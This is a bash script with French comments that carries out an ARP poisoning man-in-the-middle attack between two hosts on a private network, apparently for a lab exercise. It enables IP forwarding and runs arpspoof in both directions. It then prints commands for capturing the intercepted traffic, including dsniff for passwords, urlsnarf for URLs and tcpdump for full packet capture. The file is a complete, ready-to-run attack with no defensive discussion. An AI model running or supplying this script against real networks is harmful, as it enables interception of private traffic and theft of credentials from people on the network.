#!/bin/bash

echo "=== ARP Poisoning Attack ==="
echo "Objectif: Se placer en homme du milieu entre PC1 et PC2"

VICTIME_IP="10.0.0.10"
CIBLE_IP="10.0.0.20"
INTERFACE="eth0"

echo "Activation du routage IP..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "Lancement de l'ARP Spoofing..."
arpspoof -i $INTERFACE -t $VICTIME_IP $CIBLE_IP > /tmp/arp1.log 2>&1 &
PID1=$!

arpspoof -i $INTERFACE -t $CIBLE_IP $VICTIME_IP > /tmp/arp2.log 2>&1 &
PID2=$!

echo "Attaque en cours (PIDs: $PID1, $PID2)"
echo "Capturer le trafic:"
echo "  - Images:   driftnet -i $INTERFACE"
echo "  - URLs:     urlsnarf -i $INTERFACE"
echo "  - Passwords: dsniff -i $INTERFACE"
echo "  - Tout:     tcpdump -i $INTERFACE -w capture.pcap"
echo ""
echo "Appuyer sur Entree pour arreter l'attaque..."
read

kill $PID1 $PID2 2>/dev/null
echo "ARP Poisoning arrete."
